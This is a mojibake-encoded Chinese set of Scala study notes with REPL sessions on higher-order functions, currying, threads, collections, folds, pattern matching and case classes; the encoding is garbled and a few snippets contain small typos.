123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202åŸºæœ¬å‡½æ•°å®šä¹‰ å‚æ•°&amp;ç±»å‹ =&gt; å®ç°val f1 = (x: Int, y: Int) =&gt; x + yval f2 = (a:Double)=&gt;a*a//å®šä¹‰é«˜é˜¶å‡½æ•° ä¾‹å­1================================================================ // f æŒ‡å‚æ•°, fçš„ç±»å‹æ˜¯ (Double)=&gt;Double å‡½æ•° // è¿™é‡Œçš„å‚æ•° f å¯ä»¥æ˜¯ä»»ä½•æ¥å— Double å¹¶è¿”å› Double çš„å‡½æ•°, valueAtOneQuarter å‡½æ•°, å°†è®¡ç®—é‚£ä¸ªå‡½æ•°åœ¨ 0.25ä½ç½®çš„å€¼ // æ³¨æ„: è¿™é‡Œåªæ¥å—ä¸€ä¸ª Double å‚æ•° import scala.math._ def valueAtOneQuarter(f:Double=&gt;Double) = f(0.25) // è°ƒç”¨ // å¾€å•å‡½æ•°å‚æ•°çš„å‡½æ•° çš„ å‚æ•°ä¸­, ä¼ ä¸€ä¸ªå‡½æ•°, æ­¤å‡½æ•°ç¬¦åˆ (Double)=&gt;Double) çš„ç‰¹å¾, ç„¶åå¾€æ­¤å‡½æ•°ä¸­, ä¼ å€¼ 0.25 val f2 = (a:Double)=&gt;a* valueAtOneQuarter(f2) // æ‰§è¡Œæ—¶, ä¼šæŠŠåé¢çš„ 0.25ä¼ å…¥åˆ° valueAtOneQuarter(cail _) // cail å‡½æ•°: å¤§äºä¼ å…¥å€¼çš„æœ€å°æ•´æ•°// é«˜é˜¶å‡½æ•°ä¾‹å­2================================================================ // å‚æ•° = å‡½æ•°ä½“(å‡½æ•°) // å‚æ•° =&gt; è¿”å›å€¼ // æ–¹æ³•çš„å®ç°æ˜¯ä¸€ä¸ªå‡½æ•°, æ­¤å‡½æ•°æœ‰è‡ªå·±å®šä¹‰çš„å‚æ•°, æœ‰ä»æ–¹æ³•ä½“ä¸­ä¼ æ¥çš„å‚æ•° def mulby(factor : Double) = (x:Double) =&gt; x * factor mulby(2) scala&gt; def mulby(factor : Double) = (x:Double) =&gt; x * factor mulby: (factor: Double)Double =&gt; Double scala&gt; mulby(2) res9: Double =&gt; Double = $$Lambda$1165/745462106@3d3e9163 scala&gt; mulby(2)(2) res10: Double = 4.0&gt;&gt;&gt; æ¥ä¸‹æ¥æŠŠæ¬¡mulby æ–¹æ³•, è½¬æˆå‡½æ•°è¯•è¯• scala&gt; val f_mulby = mulby _ f_mulby: Double =&gt; (Double =&gt; Double) = $$Lambda$1364/1154393787@6307382&gt;&gt;&gt; è°ƒç”¨æ–¹å¼è¿˜æ˜¯ä¸€æ ·çš„ f_mulby(2)(2)------------------------- scala&gt;def multi(n:Int) = n * 2 scala&gt;def f = multi _ // _ è¡¨ç¤º:æŠŠmulti è½¬ä¸ºå‡½æ•° scala&gt;Array(1,2,3,4).map(f)âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ//åŒ¿åå‡½æ•° scala&gt;(n:Double)=&gt;3 * n // åŒ¿åå‡½æ•° scala&gt;val f = (n:Double)=&gt;3 * n // å˜é‡å¼•ç”¨åŒ¿åå‡½æ•° scala&gt;Array(1,2,3,4).map( (x) =&gt; x * 3 ); //æŠŠåŒ¿åå‡½æ•°ä¼ é€’ç»™ map æ–¹æ³•âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ //å®šä¹‰é«˜é˜¶å‡½æ•° ä¾‹å­3==============================================================================// å®šä¹‰ call æ–¹æ³•, å…¶ä¸­2ä¸ªå‚æ•°ä¹Ÿä¸ºå‡½æ•°def call(a:Int, b:Int, f1:(Int,Int)=&gt; Int, f2:(Int,Int)=&gt; Int) = &#123; if(a &gt; 0) f1(a,b); else f2(a,b);&#125;&gt;&gt;&gt;&gt; call: (a: Int, b: Int, f1: (Int, Int) =&gt; Int, f2: (Int, Int) =&gt; Int)Int// -------&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; å®šä¹‰æ–¹æ³•, å†æŠŠæ–¹æ³•è½¬ä¸ºå‡½æ•°// å®šä¹‰2ä¸ªå‚æ•°çš„æ–¹æ³•def add(a:Int,b:Int) = a+bdef sub(a:Int,b:Int) = a-b// æ–¹æ³•è½¬ä¸º f1, f2 (å½“ç„¶, ä¹Ÿå¯ä»¥ç›´æ¥å®šä¹‰å‡½æ•°)val f1 = add _val f2 = sub _// -------&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ç›´æ¥å®šä¹‰å‡½æ•°scala&gt; val f1 = (a : Int, b : Int) =&gt; &#123; a + b &#125;f1: (Int, Int) =&gt; Int = $$Lambda$1388/1164150759@4d41b630scala&gt; val f2 = (a : Int, b : Int) =&gt; &#123; a - b &#125;f2: (Int, Int) =&gt; Int = $$Lambda$1389/1260221930@37dc38cc// è°ƒç”¨, å¯ä»¥ç”¨f1,f2, ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨æ–¹æ³•åè°ƒç”¨, ä¼šé»˜è®¤è½¬ä¸ºå‡½æ•° :TODO äº†è§£åŸç†call(-1,2,f1,f2)call(1,2,add _, sub _)call(1,2,add,sub)// call å‡½æ•°æå‡============================================================éœ€æ±‚: ä»¥ call å‡½æ•°çš„è¿”å›å€¼3ä¸ºç³»æ•°, ç„¶åä¼ å¦ä¸€ä¸ªæ•° x åˆ° å‡½æ•°y = 3 * x ä¸­, å¾—åˆ° y------------------------------------------------------------ val f = call(1,2,f1,f2) f(100) = 300 ; call(1,2,add _,sub _)(100) = 300--&gt;&gt; å®šä¹‰ def call(a:Int,b:Int,f1:(Int,Int)=&gt;Int,f2:(Int,Int)=&gt;Int)= &#123; var n = 0 ; if(a &gt; 0) n = f1(a,b) ; else n = f2(a,b) ; // å®šä¹‰æ–¹æ³• def multi(x:Int) = x * n ; // è½¬ä¸ºå‡½æ•° multi _ &#125;âœ call: (a: Int, b: Int, f1: (Int, Int) =&gt; Int, f2: (Int, Int) =&gt; Int)Int =&gt; Intâœ è°ƒç”¨ scala&gt; call(1,2,add _, sub _)(100) res4: Int = 300âœ ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œç›´æ¥è°ƒç”¨å‡½æ•°, ä¼ çš„æ˜¯å‡½æ•°çš„å®å‚, å‡½æ•°çš„å®ç°:// f1 çš„å®ç°æ˜¯ a+b, f2 çš„å®ç°æ˜¯ a-b, è€Œè°ƒç”¨f1æˆ–f2 åœ¨ call æ–¹æ³•å®šä¹‰çš„æ—¶å€™// å°±å·²ç»æŒ‡å®šäº†, è€Œå‚æ•°ä¹Ÿç”±å‰é¢çš„ a, b ä¼ è¿›æ¥, æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨äº†.// æ­¤callæ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå‡½æ•°, æ­¤å‡½æ•°éœ€è¦2ä¸ªå‚æ•°, ä¸€ä¸ªæ˜¯å‰é¢çš„æ‰§è¡Œç»“æœ// ä¸€ä¸ªæ˜¯éœ€è¦è°ƒç”¨è€…ä¼ è¿›æ¥// è¿™é‡Œä¹Ÿå¯ä»¥æŠŠ callæ–¹æ³• çš„è¿”å›å€¼èµ‹å€¼ç»™ä¸€ä¸ª å‡½æ•°å˜é‡, å†ç»™è¿™ä¸ªå‡½æ•°å˜é‡ä¼ å€¼val f = call(1,2,(a:Int,b:Int) =&gt; a+b,(a:Int,b:Int) =&gt; a-b)scala&gt; f(100)ä¹Ÿå¯ä»¥ç›´æ¥åœ¨åé¢æ¥ä¸Š 100, ç›´æ¥ä¼ å‚call(1,2,(a:Int,b:Int) =&gt; a+b,(a:Int,b:Int) =&gt; a-b)(100)res7: Int = 300// ç±»å‹å‚æ•°å¯ä»¥å»æ‰, å› ä¸ºä½¿ç”¨çš„å‚æ•°å¯ä»¥è‡ªåŠ¨æ¨å¯¼å‡ºå‚æ•°çš„ç±»å‹ call(1,2,(a:Int,b:Int)=&gt;a + b , (a:Int,b:Int)=&gt; a- b)(100)// ç²¾ç®€è¿‡å call(1,2,(a,b)=&gt;a + b , (a,b)=&gt; a- b)(100) âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ âœâœâœâœâœâœâœâœâœâœâœâœâœâœ //å‡½æ•°æ¨æ–­ // å¾ˆæ˜¾ç„¶, æ­¤æ–¹æ³•å‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°, å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°, å‚æ•°\è¿”å›å€¼éƒ½æ˜¯ Double ç±»å‹ // æ³¨æ„: é‡Œé¢çš„å‡½æ•°æ˜¯ å½¢å‚, ä¹Ÿå°±æ˜¯è¯´ åªæ˜¯é¡¶ä¸€ä¸ªä¸€ä¸ª f å‡½æ•°, å‚æ•°&amp;è¿”å›å€¼ç±»å‹ä¸º Double, å¹¶æ²¡æœ‰å®šä¹‰å®ç°, åœ¨ä¼ å‡½æ•°çš„æ—¶å€™, è¦ç»™å‡ºå®ç° def valueAt(f:(Double)=&gt;Double) = f(0.25)âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ valueAt((x:Double)=&gt;x * 3) //å®šä¹‰ç±»å‹ valueAt((x)=&gt;x * 3) //æ¨æ–­ç±»å‹ valueAt(x=&gt;x * 3) //çœç•¥() valueAt(3 * _) //å‚æ•°åœ¨å³ä¾§å‡ºç°1æ¬¡ï¼Œå°±å¯ä»¥ä½¿ç”¨_ä»£æ›¿ã€‚//é«˜çº§å‡½æ•°âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ scala&gt; val arr = Array(1,2,3,4) scala&gt; arr.map(2 * _); //æ¯ä¸ªå…ƒç´ x2 scala&gt; arr.map((e:Int)=&gt; e * 2); //æ¯ä¸ªå…ƒç´ x2 scala&gt; arr.map(_ * 2); //æ¯ä¸ªå…ƒç´ x2 scala&gt; arr.filter(_ % 2 == 0) // è¿‡æ»¤å‡ºé›†åˆä¸­çš„å¶æ•°res55: scala.collection.immutable.IndexedSeq[Int] = Vector(2, 4)// å…¶å®ƒçš„ç®€å•åº”ç”¨âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ// åœ¨å…ƒç´  * 3å‰å…ˆæ‰“å° scala&gt; Array(1,2,3).map(e =&gt; &#123;println(e); e * 3&#125;) 1 2 3 res56: Array[Int] = Array(3, 6, 9)// filter è¿‡æ»¤ scala&gt; Array(1,2,3,4).filter(e =&gt; e%2 == 0) res14: Array[Int] = Array(2, 4)// 1-10 å…ˆæ‰©å¤§3å€, å†è¿‡æ»¤å‡ºå¶æ•° scala&gt; Array(1 to 10:_*).map(3 * _).filter(_ % 2 == 0) res16: Array[Int] = Array(6, 12, 18, 24, 30)//è¾“å‡ºä¸‰è§’å½¢ foreach å‡½æ•°âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ scala&gt;(1 to 9).map("*" * _).foreach(println) scala&gt;(1 to 9).map("*" * _).foreach(println _) scala&gt;(1 to 9).map("*" * _).foreach(println (_)) scala&gt; Array(1 to 9:_*).map("*" * _).foreach(println _)// reduceLeft / reduceRight å‡½æ•°âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ//reduceLeft,ç”±å·¦è‡³å³, æ¯æ¬¡è¿›2ä¸ªå‚æ•° val r = (1 to 10) scala&gt; r.reduceLeft(_ + _) scala&gt; r.reduceLeft(_ - _)...â†’ æ‰§è¡Œæµç¨‹ //1,2,3 ==&gt; (1 - 2) -3) = -4MR:MapTask + reduceTask,æ˜ å°„åŒ–ç®€.//reduceRight,ç”±å³è‡³å·¦ scala&gt; r.reduceRight(_-_) ...â†’ æ‰§è¡Œæµç¨‹ //1,2,3 ==&gt;1 - (2 - 3)= 2 //1,2,3,4 ==&gt; 1 - (2 - (3 - 4)) = -2 //1,2,3,4 ==&gt; 1 - (2 - (3 - 4)) = -2 åä¸€. æŸ¯é‡ŒåŒ–æ¦‚å¿µ: ä»¥é€»è¾‘å­¦å®¶ Haskell Brooks Curry çš„åå­—å‘½å å°†åŸæ¥æ¥å—2ä¸ªå‚æ•°çš„å‡½æ•°, å˜æˆæ–°çš„æ¥å—ä¸€ä¸ªå‚æ•°çš„å‡½æ•°çš„è¿‡ç¨‹. æ–°çš„å‡½æ•°è¿”å›ä¸€ä¸ªä»¥åŸæœ‰ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå‚æ•°çš„å‡½æ•° 1234567891011121314151617181920212223â†’ åŸå‡½æ•°scala&gt;def mul(a:Int,b:Int) = a * b;scala&gt;mul(1,2)â†’ æŸ¯é‡ŒåŒ–scala&gt;def mulone(a:Int) = &#123;(x:Int) =&gt; a * x ;&#125;scala&gt;mulone(1)(2)â†’â†’â†’â†’â†’â†’â†’ æŸ¯é‡ŒåŒ–æµ‹è¯•scala&gt; def mulone(a:Int) = &#123;(x:Int) =&gt; a * x&#125;mulone: (a: Int)Int =&gt; Int// é¦–å…ˆä¼ å…¥ä¸€ä¸ªå‚æ•°, å¾—åˆ°çš„æ˜¯å¦ä¸€å‡½æ•° x:Int =&gt; x * 2 (ä¹Ÿå°±æ˜¯åŸæ–¹æ³•çš„æ–¹æ³•ä½“)scala&gt; def f = mulone(2)f: Int =&gt; Int// æ­¤æ—¶æ¥ç€å†ä¼ å…¥å‚æ•° 4, å¾—åˆ° 4*2 =&gt; 8 scala&gt; f(4)res33: Int = 8// ç›´æ¥ä¼ å…¥2ä¸ªå‚æ•°å¯ç›´æ¥è°ƒç”¨æ­¤æ–¹æ³•, è¿”å›ç»“æœscala&gt; mulone(2)(4)res34: Int = 8 ä¸æŸ¯é‡ŒåŒ–ç›¸å…³çš„çŸ¥è¯†ç‚¹(æ–¹æ³•å‘å‡½æ•°çš„è½¬æ¢) 1234567891011121314151) å¤šä¸ªå‚æ•°çš„æ–¹æ³•å¯ä»¥è½¬æ¢ä¸ºå¤šå…ƒå‡½æ•°-------------------scala&gt; def plus(x: Int, y: Int): Int = x + yplus: (x: Int, y: Int)Intscala&gt; plus _res63: (Int, Int) =&gt; Int = $$Lambda$1495/772136419@16b544162) å¤šä¸ªå‚æ•°çš„æ–¹æ³•å˜æˆæŸ¯é‡Œå‡½æ•° ---&gt; æ–¹æ³•å®šä¹‰çš„æ—¶å€™, ä¸åŒçš„å‚æ•°ç”¨ '()' åˆ†å¼€---------------------scala&gt; def plus(x: Int)(y: Int): Int = x + yplus: (x: Int)(y: Int)Intscala&gt; plus _res64: Int =&gt; (Int =&gt; Int) = $$Lambda$1496/662093445@51927988 åäºŒ. æ§åˆ¶æŠ½è±¡12345678910111213141516171819202122232425262728293031323334// ç±»ä¼¼äº OC ä¸­çš„ block, æ­¤ block æ— å‚æ•°æ— è¿”å›å€¼ :TODO æ˜¯æ§åˆ¶âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ1) å®šä¹‰è¿‡ç¨‹ï¼Œå¯åŠ¨åˆ†çº¿ç¨‹æ‰§è¡Œblockä»£ç . æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ª block æ— å‚æ— è¿”å‡½æ•° def newThread(block: () =&gt; Unit) &#123; new Thread() &#123; override def run() &#123; block(); &#125; &#125;.start(); &#125;-----------------2) è°ƒç”¨ newThreadæ–¹æ³•, å¹¶ç»™ block ä¼ å€¼ 'newThread(()=&gt;&#123;...&#125;)' newThread(() =&gt; &#123; (1 to 10).foreach(e =&gt; &#123; val tname = Thread.currentThread.getName(); println(tname + " : " + e); &#125;) &#125; );-------æ‰“å°ç»“æœ----------scala&gt; Thread-3 : 1Thread-3 : 2Thread-3 : 3Thread-3 : 4Thread-3 : 5Thread-3 : 6Thread-3 : 7Thread-3 : 8Thread-3 : 9Thread-3 : 10âœâœâœâœâœâœâœâœâœâœâœâœâœ PS: åœ¨ å®šä¹‰æ–¹æ³•çš„æ—¶å€™, å¯çœç•¥'newThread(()=&gt;&#123;...&#125;)'å‰é¢çš„æ‹¬å·, å› ä¸ºæ²¡æœ‰å‚æ•° åœ¨è°ƒç”¨æ–¹æ³•, å†™ block ä¸­çš„å†…å®¹æ—¶ 'newThread(() =&gt; &#123;&#125;)', å¯ä»¥ç›´æ¥å†™å¤§æ‹¬å·&#123;&#125;ä¸­çš„ä»£ç é€»è¾‘, å…¶å®è¿™ç©æ„å„¿å°±æ˜¯ è¯­æ³•ç³– åä¸‰. é›†åˆList é›†åˆList åœ¨æ·»åŠ å…ƒç´ æ—¶æ³¨æ„ç‚¹,è¯¦ç»†ä»£ç è§ä¸‹é¢: ä½¿ç”¨ +: æˆ–:=æ·»åŠ å•ä¸ªå…ƒç´ æ—¶, :å¿…é¡»é ç€ list ä¸€ä¾§, + å¿…é¡»é ç€ å•ä¸ªå…ƒç´  å¦‚æœ2è¾¹éƒ½æ˜¯ list é›†åˆ, å¿…é¡»ç”¨ ++:æˆ–è€… ::: æˆ–è€… ++ ä¸ç®¡æ˜¯ +: , :+ , ++:, éƒ½ä¸ä¼šæ”¹å˜åŸ list çš„å€¼ è¦æ·»åŠ çš„ å…ƒç´  / list åœ¨åŸ list çš„å“ªè¾¹, å°±æ·»åŠ åˆ° list çš„ é‚£è¾¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081//Nil (Listç©ºé›†åˆ)âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ scala&gt; 1::2::Nilres71: List[Int] = List(1, 2)scala&gt; var l1 = 1::2::Nill1: List[Int] = List(1, 2)scala&gt; l1res72: List[Int] = List(1, 2)scala&gt; 9::l1res73: List[Int] = List(9, 1, 2)// List æ±‚å’Œâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ æ–¹å¼1-é€’å½’-----------å®šä¹‰&gt; def sum(list:List[Int]) : Int = &#123; if(list == Nil) 0 else list.head + sum(list.tail) &#125; sum: (list: List[Int])Intè°ƒç”¨&gt; scala&gt; val list = 1::2::3::4::Nil list: List[Int] = List(1, 2, 3, 4)scala&gt; sum(list)res41: Int = 10æ–¹å¼2-æ¨¡å¼åŒ¹é…-----------å…¶å®æœ¬è´¨ä¸Šä¹Ÿæ˜¯é€’å½’å®šä¹‰&gt;def sum(list:List[Int]) : Int = list match &#123; case Nil =&gt; 0 case a::b =&gt; a + sum(b)&#125;æ³¨æ„: ::å°†åˆ—è¡¨ ææ„ æˆå¤´éƒ¨å’Œå°¾éƒ¨é€’å½’ä¹‹æ‰€ä»¥é‚£ä¹ˆè‡ªç„¶, å› ä¸ºåˆ—è¡¨çš„å°¾éƒ¨æ­£å¥½åˆæ˜¯ä¸€ä¸ªåˆ—è¡¨-------------------------------------------------------scala ç±»åº“çš„ sumList(2,3,4).sum// List æ·»åŠ å…ƒç´ âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ æ³¨æ„ç‚¹: 1) ä½¿ç”¨ +: æˆ– := æ·»åŠ å•ä¸ªå…ƒç´ æ—¶, : å¿…é¡»é ç€ list ä¸€ä¾§, + å¿…é¡»é ç€ å•ä¸ªå…ƒç´  2) å¦‚æœ2è¾¹éƒ½æ˜¯ list, å¿…é¡»ç”¨ ++: 3) ä¸ç®¡æ˜¯ +: :+ ++:, éƒ½ä¸ä¼šæ”¹å˜åŸ list çš„å€¼ 4) è¦æ·»åŠ çš„ å…ƒç´  / list åœ¨å“ªè¾¹, å°±æ·»åŠ åˆ°æ•°ç»„çš„å“ªè¾¹ scala&gt; var list2 = 1::2::3::5::4::Nil list2: List[Int] = List(1, 2, 3, 5, 4) scala&gt; list2 res46: List[Int] = List(1, 2, 3, 5, 4) scala&gt; list2 :+ 3 res81: List[Int] = List(1, 2, 3, 5, 4, 3) scala&gt; 3 +: list2 res82: List[Int] = List(3, 1, 2, 3, 5, 4) scala&gt; list2 res88: List[Int] = List(1, 2, 3, 5, 4) scala&gt; list2 ++: List(99) res86: List[Int] = List(1, 2, 3, 5, 4, 99) scala&gt; List(78) ++: list2 res87: List[Int] = List(78, 1, 2, 3, 5, 4)// ++ æ·»åŠ  å®ç°2é›†åˆåˆå¹¶ scala&gt;val l1 = List(1,2) scala&gt;val l2 = List(3,4) scala&gt;l1 ++ l2 ++ ä¸ :: æ•ˆæœç›¸åŒ // æ˜¯åœ¨l1çš„åé¢åŠ ä¸Šl2 scala&gt;l1 ++: l2 ++: ä¸ ::: æ•ˆæœç›¸åŒ // æ˜¯åœ¨ l2çš„å‰é¢åŠ ä¸Šl1 Set é›†åˆæ³¨æ„: ä¸å¯å˜ Set æ·»åŠ çš„æ˜¯ å…ƒç¥–, ä½¿ç”¨+= äº§ç”Ÿæ–°é›†åˆ, è‡ªèº«æ— æ³•æ”¹å˜, å¯ä»¥èµ‹å€¼ç»™æ–°çš„å¸¸é‡ val å¯å˜ Set ä¹Ÿå¯ä»¥ä½¿ç”¨ += æ·»åŠ  å…ƒç¥–, æ”¹å˜è‡ªèº«, è¿˜å¯ä»¥ä½¿ç”¨ ++= æ·»åŠ å…¶ä»–é›†åˆ, æ¯”å¦‚ List, Array, Range(1 to 10) ç­‰â€¦ 1234567891011121314151617181920212223242526272829303132333435// Set å¯å˜é›†åˆçš„æ“ä½œ(é»˜è®¤)------------------------------------------------------------// Set æ·»åŠ æˆå‘˜(å…ƒç¥–, ä¼šè‡ªåŠ¨å»é‡, æ— åº) scala&gt;val set = Set(1,2,3) scala&gt;set + (1,2,3,5) scala&gt;set - (1,2,3,5) scala&gt;val s1 = Set(1,2,3) scala&gt;val s2 = Set(2,3,4) scala&gt;s1 | s2 //å¹¶é›† scala&gt;s1 &amp; s2 //äº¤é›† scala&gt;s1 &amp;~ s2 //å·®é›†(1,2,3) - (2,3,4) = (1)// Set ä¸å¯å˜é›†åˆçš„æ“ä½œ------------------------------------------------------------# å¯¼åŒ…scala&gt;import scala.collection.mutable.&#123;Set =&gt; MSet&#125;// ä½¿ç”¨ += æ·»åŠ å…ƒç¥–scala&gt; mset += 3res129: mset.type = Set(0, 9, 45, 1, 2, 3, 10, 4, 98, 5, 6, 7, 43, ğŸ˜scala&gt; mset += (24,25,26)res132: mset.type = Set(0, 9, 45, 1, 2, 24, 3, 10, 25, 4, 98, 26, 5, 6, 21, 7, 43, ğŸ˜// ä½¿ç”¨ ++= æ·»åŠ  Array, List, Range...scala&gt; mset ++= Array(3,45)res125: mset.type = Set(0, 9, 45, 1, 5, 2, 6, 3, 10, 7, 4, ğŸ˜scala&gt; mset ++= List(43,98)res128: mset.type = Set(0, 9, 45, 1, 2, 3, 10, 4, 98, 5, 6, 7, 43, ğŸ˜scala&gt; mset ++= (0 to 10)res123: mset.type = Set(0, 9, 1, 5, 2, 6, 3, 10, 7, 4, ğŸ˜ å…¶ä»–çš„ä¸€äº›æ“ä½œ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// ä¸»è¦æ˜¯ ArrayBufferçš„------------------------------------------------------------scala&gt; import scala.collection.mutable._import scala.collection.mutable._scala&gt; val buf = ArrayBuffer(1,2,3)buf: scala.collection.mutable.ArrayBuffer[Int] = ArrayBuffer(1, 2, 3)scala&gt; 2 +=: bufres138: buf.type = ArrayBuffer(2, 1, 2, 3)// æå–å‰2ä¸ªå…ƒç´ , buf æœ¬èº«ä¸å˜scala&gt; buf.take(2)res139: scala.collection.mutable.ArrayBuffer[Int] = ArrayBuffer(2, 1)// åˆ é™¤å‰2ä¸ªå…ƒç´ , buf æœ¬èº«ä¸å˜scala&gt; buf.drop(2)res141: scala.collection.mutable.ArrayBuffer[Int] = ArrayBuffer(2, 3)scala&gt; bufres142: scala.collection.mutable.ArrayBuffer[Int] = ArrayBuffer(2, 1, 2, 3)// åœ¨æŒ‡å®šä½ç½®è¿›è¡Œåˆ‡å‰²ï¼Œå½¢æˆä¸¤ä¸ªæ–°é›†åˆã€‚scala&gt; buf.splitAt(2)res143: (scala.collection.mutable.ArrayBuffer[Int], scala.collection.mutable.ArrayBuffer[Int]) = (ArrayBuffer(2, 1),ArrayBuffer(2, 3))scala&gt; val b1 = ArrayBuffer(1,2,3)scala&gt; val b2 = ArrayBuffer(3,4,5,6)// èˆå¼ƒæ‰å°‘çš„scala&gt; b1.zip(b2) res145: scala.collection.mutable.ArrayBuffer[(Int, Int)] = ArrayBuffer((1,3), (2,4), (3,5))// b1ä¸å¤Ÿ, ç”¨-1è¡¥, b2ä¸å¤Ÿ, ç”¨-2è¡¥scala&gt; b1.zipAll(b2,-1,-2)res146: scala.collection.mutable.ArrayBuffer[(Int, Int)] = ArrayBuffer((1,3), (2,4), (3,5), (-1,6))//å…ƒç´ å’Œè‡ªå·±çš„ç´¢å¼•å½¢æˆtuple.,å…ƒç´ åœ¨å‰, ç´¢å¼•åœ¨åscala&gt; b1.zipWithIndexres147: scala.collection.mutable.ArrayBuffer[(Int, Int)] = ArrayBuffer((1,0), (2,1), (3,2))scala&gt; b1.zip(b2).zipWithIndexres148: scala.collection.mutable.ArrayBuffer[((Int, Int), Int)] = ArrayBuffer(((1,3),0), ((2,4),1), ((3,5),2))// å·¦å³æŠ˜å ------------------------------------------------------------//å·¦æŠ˜å scala&gt; List(1,7,2,9).foldLeft(0)(_-_)res87: Int = -19 (0 - 1) - 7 - 2 - 9 //-19 //å³æŠ˜å scala&gt; List(1,7,2,9).foldRight(0)(_-_)res88: Int = -13 1 - (7 - (2 - (9 - 0))_ //-13 åå››. æ¨¡å¼åŒ¹é… &amp; åå‡½æ•°1. å­—ç¬¦ä¸²åŒ¹é…12345678910scala&gt; val x = '9'x: Char = 9scala&gt; x match&#123; | case '+' =&gt; print("++++") | case '_' =&gt; print("-----") | case _ if Character.isDigit(x) =&gt; print("is number!") | case _ =&gt; print("...") | &#125;&gt; is number! 2. åŒ¹é…ç±»å‹,xç±»å‹å®šä¹‰æˆåˆ¤æ–­ç±»å‹çš„å…±åŒè¶…ç±»ã€‚123456789scala&gt; val x:Any = "123"x: Any = 123scala&gt; x match&#123; | case b:Int =&gt; print("is Int") ; | case a:String =&gt; print("is String") ; | case _ =&gt; print("is Int") ; | &#125;is String 3. åŒ¹é…æ•°ç»„æ•°æ®12345678910111213scala&gt; val arr = Array(0,1,2)arr: Array[Int] = Array(0, 1, 2)scala&gt; arr match&#123; | //åŒ¹é…arrä¸­åªæœ‰ 0 | case Array(0) =&gt; println("arr ä¸­åªå«æœ‰0") | //åŒ¹é…æ˜¯å¦ä¸¤ä¸ªå…ƒç´  | case Array(x,y) =&gt; println("æœ‰ä¸¤ä¸ªå…ƒç´ ") | //æ˜¯å¦ä»0å¼€å§‹ | case Array(0,_*) =&gt; println("ä»0å¼€å§‹") | case _ =&gt; println("æœ‰0") &#125;// è¿˜å¯ä»¥åŒ¹é…å…¶å®ƒå¤æ‚æ•°æ®ç±»å‹ä¸­æŸä¸ªä½ç½®ä¸Šçš„å€¼. 4. åå‡½æ•°æŠŠæ¨¡å¼åŒ¹é…æŠ½å‡ºæ¥å˜æˆå‡½æ•°äº† 12345678910111213 ---å®šä¹‰ val f : PartialFunction[Char, Int] = &#123; case '+' =&gt; 1; case '-' =&gt; -1; case _ =&gt; 0 &#125;---æµ‹è¯• scala&gt; f('x') res106: Int = 0 scala&gt; f('+') res107: Int = 1 åäº”. æ ·ä¾‹ç±»å…³é”®å­— : case ä¸»è¦ç”¨äºæ¨¡å¼åŒ¹é…. å†…ç½®äº†applyå’Œunapplyæ–¹æ³•ï¼Œè¿˜æœ‰ä¸²è¡ŒåŒ–ç­‰æ¥å£ã€‚ åˆ›å»ºå¯¹è±¡æ—¶ä¸éœ€è¦ä½¿ç”¨new. 123456789101112131415161718192021222324252627282930313233343536373839404142 // åˆ›å»ºæ ·ä¾‹ç±»âœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœâœ abstract class Dog&#123;&#125; case class Jing8(name:String) extends Dog&#123;&#125; case class Shapi(age:Int) extends Dog&#123;&#125; scala&gt; val d = Jing8("tom") // å¯ä»¥ç›´æ¥åˆ›å»º, å› ä¸ºå†…ç½®äº† apply d match&#123; case Jing8(name) =&gt; print("æ˜¯Jing8 : " + name); case Shapi(age) =&gt; print("æ˜¯Shapi : " + age); case _ =&gt; print("aishiuihsui"); &#125;--&gt; è¿è¡Œç»“æœ:æ˜¯ Jing8: tom// æŸ¥çœ‹ .class æ–‡ä»¶// å‘ç°æœ‰ apply, unapply, implements scala.Serializable ç­‰--------------------------------------------------âœ scala javap -private Jing8$.classCompiled from "dog.scala"public final class Jing8$ extends scala.runtime.AbstractFunction1&lt;java.lang.String, Jing8&gt; implements scala.Serializable &#123; public static Jing8$ MODULE$; public static &#123;&#125;; public final java.lang.String toString(); public Jing8 apply(java.lang.String); public scala.Option&lt;java.lang.String&gt; unapply(Jing8); private java.lang.Object readResolve(); public java.lang.Object apply(java.lang.Object); private Jing8$();&#125;// 